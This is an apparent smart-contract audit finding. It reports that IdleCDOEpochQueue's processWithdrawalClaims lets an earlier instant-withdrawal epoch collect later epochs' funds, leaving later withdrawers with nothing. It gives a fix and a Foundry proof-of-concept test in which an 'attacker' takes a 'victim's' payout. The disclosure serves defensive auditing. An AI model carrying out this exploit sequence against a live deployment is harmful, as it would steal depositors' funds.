### Title
Unclaimed instant withdrawals from later epochs are paid to an earlier epoch’s queued withdrawers - (File: `contracts/IdleCDOEpochQueue.sol`)

### Summary
`IdleCDOEpochQueue.processWithdrawalClaims` records claims by queue epoch, but claims through the CDO’s aggregate `claimInstantWithdrawRequest` endpoint without checking that the strategy receipt being settled belongs to the requested epoch. [1](#0-0) [2](#0-1) 

### Finding Description
`processWithdrawRequests` associates a queued withdrawal batch with the current strategy epoch and stores only that batch in `epochPendingClaims[_epoch]`. [3](#0-2)  For instant batches it later calls `claimInstantWithdrawRequest`, which burns and pays the queue’s entire aggregate `instantWithdrawsRequests` balance rather than an epoch-scoped amount. [4](#0-3) [2](#0-1) 

The queue treats any amount received as belonging to the `_epoch` argument and rescales that epoch’s `epochWithdrawPrice` by `_received / epochPendingClaims[_epoch]`. [5](#0-4)  If a funded instant receipt from epoch N remains unprocessed while another instant batch is processed for epoch N+1, claiming the epoch-N batch sweeps both receipts but assigns their combined value only to epoch-N requesters. [6](#0-5) [7](#0-6) 

### Impact Explanation
A user in the earlier instant-withdrawal epoch receives the underlying backing both their own request and all later outstanding instant requests made through the same queue. [8](#0-7) [7](#0-6)  The later epoch is then processed as a zero-value claim because the aggregate receipt has already been burned, permanently converting the later requesters’ payout to zero. [2](#0-1) [9](#0-8) 

### Likelihood Explanation
The attacker only needs a valid queued instant-withdrawal request in the earlier epoch; no privileged or malicious role is required. [10](#0-9)  Honest manager processing can create the overlap because instant claims may remain pending while later epochs queue and process another instant batch, and `processWithdrawalClaims` does not enforce that the supplied epoch is the only outstanding instant claim. [11](#0-10) [12](#0-11) 

### Recommendation
Track claim ownership by epoch through the entire request/claim path instead of claiming an aggregate instant balance for whichever queue epoch is supplied. [6](#0-5) [12](#0-11)  Alternatively, add an epoch-scoped instant claim function to `IdleCreditVault` that burns and transfers only `instantWithdrawsRequestsByEpoch[queue][_epoch]`, and have `processWithdrawalClaims` revert unless the received amount matches that epoch’s claim basis. [2](#0-1) 

### Proof of Concept

```solidity
function testEarlierInstantEpochStealsLaterInstantEpochClaim() external {
  _useStandardEpochVariant();

  // Make a lower next-epoch APR eligible for instant withdrawals.
  _stopCurrentEpochWithApr(10e18);
  uint256 instantDelay = 100;
  vm.prank(manager);
  cdoEpoch.setInstantWithdrawParams(instantDelay, 0, false);

  address attacker = makeAddr("attacker");
  address victim = makeAddr("victim");

  uint256 attackerTranches = _depositWithUser(attacker, 1e6);
  uint256 victimTranches = _depositWithUser(victim, 100e6);

  vm.prank(manager);
  cdoEpoch.startEpoch();

  // Queue only the attacker's instant withdrawal for epoch N.
  _requestWithdrawWithUser(attacker, attackerTranches);
  _stopCurrentEpochWithApr(1e18);

  uint256 epochN = strategy.epochNumber();
  vm.prank(manager);
  queue.processWithdrawRequests();
  uint256 attackerPending = queue.epochPendingClaims(epochN);
  assertTrue(queue.isEpochInstant(epochN));

  // Fund the instant queue but intentionally do not process its claim yet.
  vm.prank(manager);
  cdoEpoch.startEpoch();

  // During epoch N, queue the victim's instant withdrawal for epoch N + 1.
  _requestWithdrawWithUser(victim, victimTranches);
  _stopCurrentEpochWithApr(0);

  uint256 epochNPlusOne = strategy.epochNumber();
  vm.prank(manager);
  queue.processWithdrawRequests();
  uint256 victimPending = queue.epochPendingClaims(epochNPlusOne);
  assertTrue(queue.isEpochInstant(epochNPlusOne));

  vm.prank(manager);
  cdoEpoch.startEpoch();
  skip(instantDelay + 1);

  // The epoch-N claim burns the aggregate queue receipt and receives both batches.
  uint256 queueBalanceBefore = underlying.balanceOf(address(queue));
  vm.prank(manager);
  queue.processWithdrawalClaims(epochN);

  assertEq(
    underlying.balanceOf(address(queue)) - queueBalanceBefore,
    attackerPending + victimPending
  );

  // All value is credited to epoch N even though victimPending belongs to epoch N + 1.
  assertApproxEqAbs(
    queue.epochWithdrawPrice(epochN),
    (attackerPending + victimPending) * ONE_TRANCHE / attackerTranches,
    2
  );

  uint256 attackerBalanceBefore = underlying.balanceOf(attacker);
  vm.prank(attacker);
  queue.claimWithdrawRequest(epochN);
  assertApproxEqAbs(
    underlying.balanceOf(attacker) - attackerBalanceBefore,
    attackerPending + victimPending,
    2
  );

  // Processing epoch N + 1 now receives nothing and marks the victim payout as zero.
  vm.prank(manager);
  queue.processWithdrawalClaims(epochNPlusOne);
  assertTrue(queue.isEpochWithdrawZero(epochNPlusOne));

  uint256 victimBalanceBefore = underlying.balanceOf(victim);
  vm.prank(victim);
  queue.claimWithdrawRequest(epochNPlusOne);
  assertEq(underlying.balanceOf(victim) - victimBalanceBefore, 0);
}
```

```text
  function processWithdrawalClaims(uint256 _epoch) external {
    IdleCDOEpochVariant _cdo = IdleCDOEpochVariant(idleCDOEpoch);
    // only owner or strategy manager can call this
    _checkOnlyOwnerOrManager();

    uint256 _pending = epochPendingClaims[_epoch];
    if (_pending == 0) {
      return;
    }
    uint256 _balPre = IERC20Detailed(underlying).balanceOf(address(this));

    // check if the epoch is an instant withdraw epoch.
    // These calls will transfer underlyings to this contract and burn strategyTokens
    if (isEpochInstant[_epoch]) {
      _cdo.claimInstantWithdrawRequest();
    } else {
      _cdo.claimWithdrawRequest();
    }
    uint256 _received = IERC20Detailed(underlying).balanceOf(address(this)) - _balPre;
    // In APR=0 flow the final claimed amount can differ from request-time pending claims.
    // Rebase the withdraw price to the realized amount so users claim the correct final value.
    if (_received != _pending) {
      uint256 _updatedPrice = epochWithdrawPrice[_epoch] * _received / _pending;
      epochWithdrawPrice[_epoch] = _updatedPrice;
      // A valid aggregate recovery can still round this queue's small share to zero. Record that
      // terminal outcome explicitly so users can clear claims and later epochs are not blocked.
      if (_updatedPrice == 0) {
        isEpochWithdrawZero[_epoch] = true;
      }
    }

    // reset epoch pending claims
    epochPendingClaims[_epoch] = 0;
    // reset pending claims flag
```
